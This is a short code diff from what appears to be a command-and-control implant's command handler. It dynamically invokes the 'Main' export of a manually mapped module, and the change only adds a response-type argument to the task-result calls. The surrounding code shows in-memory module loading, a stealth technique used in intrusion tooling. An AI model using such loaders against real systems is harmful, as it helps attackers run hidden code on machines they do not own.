@@ -33,13 +33,13 @@ namespace Engineer.Commands
                 IntPtr address =  reprobate.GetExportAddress(mappedModule.ModuleBase, "Main");
 
                 string output = ((string)reprobate.DynamicFunctionInvoke(address, typeof(GenericDelegate),ref parameters));
-                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete);
+                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
                 // reprobate.CallMappedPEModule(mappedModule.PEINFO, mappedModule.ModuleBase);
 
             }
             catch(Exception ex)
             {
-                Tasking.FillTaskResults("error: " +ex.Message,task,EngTaskStatus.Failed);
+                Tasking.FillTaskResults("error: " +ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                 
             }
         }
